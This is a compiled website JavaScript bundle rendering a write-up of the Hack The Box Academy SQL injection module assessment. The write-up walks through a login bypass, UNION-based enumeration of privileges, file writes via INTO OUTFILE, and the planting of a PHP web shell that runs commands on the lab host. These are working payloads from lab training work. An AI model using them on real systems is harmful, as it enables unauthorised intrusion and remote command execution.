"use strict";(self.webpackChunkhacking=self.webpackChunkhacking||[]).push([[9808],{3726:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>r,metadata:()=>l,toc:()=>o});var a=s(5893),t=s(1151);const r={slug:"/write-up/htb-academy/sqli",pagination_next:null,pagination_prev:null},i=void 0,l={id:"Hacking/Write-ups/Academy/SQL injections/SQL injections",title:"SQL injections",description:"This is the write-up for the assessment of HTB academy SQL injections module.",source:"@site/docs/Hacking/Write-ups/Academy/SQL injections/SQL injections.md",sourceDirName:"Hacking/Write-ups/Academy/SQL injections",slug:"/write-up/htb-academy/sqli",permalink:"/docs/write-up/htb-academy/sqli",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{slug:"/write-up/htb-academy/sqli",pagination_next:null,pagination_prev:null},sidebar:"tutorialSidebar"},c={},o=[{value:"Login page",id:"login-page",level:2},{value:"Search box",id:"search-box",level:2}];function d(e){const n={a:"a",code:"code",h2:"h2",p:"p",pre:"pre",...(0,t.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsxs)(n.p,{children:["This is the write-up for the assessment of HTB academy ",(0,a.jsx)(n.a,{href:"https://academy.hackthebox.com/module/33",children:"SQL injections"})," module."]}),"\n",(0,a.jsx)(n.h2,{id:"login-page",children:"Login page"}),"\n",(0,a.jsx)(n.p,{children:"First of all we're given a login page, most likely we'll need to provide a SQLi to bypass the login."}),"\n",(0,a.jsxs)(n.p,{children:["Let's evaluate which fields are vulnerable to SQLi by providing a dangling character, e.g: ",(0,a.jsx)(n.code,{children:"'"})," to break the query."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"curl -vvv 'http://83.136.251.235:30056/' -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=\\'&password=1234'\n"})}),"\n",(0,a.jsxs)(n.p,{children:["We couldn't break any field with the escape characters. We can try some of the pre-defined SQL injections from ",(0,a.jsx)(n.a,{href:"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases",children:"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases"}),"."]}),"\n",(0,a.jsx)(n.p,{children:"The second one worked fine:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"' OR 1 -- -\n"})}),"\n",(0,a.jsx)(n.p,{children:"and we're presented a dashboard with a search box."}),"\n",(0,a.jsx)(n.h2,{id:"search-box",children:"Search box"}),"\n",(0,a.jsx)(n.p,{children:"The search box make a request like:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"curl 'http://83.136.251.235:30056/dashboard/dashboard.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=t7addrm0eidu7ag6m1e7e31geo' --data-raw 'search=a'\n"})}),"\n",(0,a.jsx)(n.p,{children:"Looks like the search only works to search the values in the date."}),"\n",(0,a.jsxs)(n.p,{children:["We should follow the same approach: let's try to break the search with escape character: ",(0,a.jsx)(n.code,{children:"'"})," and it worked, we can see an error."]}),"\n",(0,a.jsx)(n.p,{children:"Let's try to determine the number of columns:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"a' UNION SELECT 1,2,3,4 -- -\n"})}),"\n",(0,a.jsxs)(n.p,{children:["It shows: ",(0,a.jsx)(n.code,{children:" The used SELECT statements have a different number of columns"})]}),"\n",(0,a.jsx)(n.p,{children:"It worked with:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"a' UNION SELECT 1,2,3,4,5 -- -\n"})}),"\n",(0,a.jsx)(n.p,{children:"But the first column is not shown"}),"\n",(0,a.jsx)(n.p,{children:"The objective is to install a web-shell, so let's enumerate if we're capable of."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"a' UNION SELECT 1,user(),3,4,5 -- -\n"})}),"\n",(0,a.jsxs)(n.p,{children:["and we got ",(0,a.jsx)(n.code,{children:"root@localhost"})]}),"\n",(0,a.jsx)(n.p,{children:"Let's check privileges:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"a' UNION SELECT 1,grantee, privilege_type,4,5 FROM information_schema.user_privileges WHERE grantee=\"'root'@'localhost'\" -- -\n"})}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"FILE"})," privilege is there."]}),"\n",(0,a.jsx)(n.p,{children:"Check for write file global var:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:'a\' UNION SELECT 1,variable_name, variable_value,4,5 FROM information_schema.global_variables where variable_name="secure_file_priv" -- -\n'})}),"\n",(0,a.jsx)(n.p,{children:"The variable is not set, so we can write."}),"\n",(0,a.jsx)(n.p,{children:"Let's try it:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"a' UNION SELECT 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt' -- -\n"})}),"\n",(0,a.jsx)(n.p,{children:"Now let's try to read it, before we try to install the shell."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"a' UNION SELECT 1,LOAD_FILE('/var/www/html/dashboard/proof.txt'),3,4,5 -- -\n"})}),"\n",(0,a.jsx)(n.p,{children:"We got the contents back, so let's install the shell."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:'a\' UNION select "",\'<?php system($_REQUEST[0]); ?>\', "", "", "" into outfile \'/var/www/html/dashboard/1.php\' -- -\n'})}),"\n",(0,a.jsxs)(n.p,{children:["And we've got the shell ",(0,a.jsx)(n.code,{children:"http://83.136.251.235:30056/dashboard/1.php?0=id"})]}),"\n",(0,a.jsxs)(n.p,{children:["Now we list files at root: ",(0,a.jsx)(n.code,{children:"http://83.136.251.235:30056/dashboard/1.php?0=ls%20/"})]}),"\n",(0,a.jsxs)(n.p,{children:["Now we can retrieve the flag: ",(0,a.jsx)(n.code,{children:"http://83.136.251.235:30056/dashboard/1.php?0=cat%20/flag_cae1dadcd174.txt"})]})]})}function h(e={}){const{wrapper:n}={...(0,t.a)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},1151:(e,n,s)=>{s.d(n,{Z:()=>l,a:()=>i});var a=s(7294);const t={},r=a.createContext(t);function i(e){const n=a.useContext(r);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),a.createElement(r.Provider,{value:n},e.children)}}}]);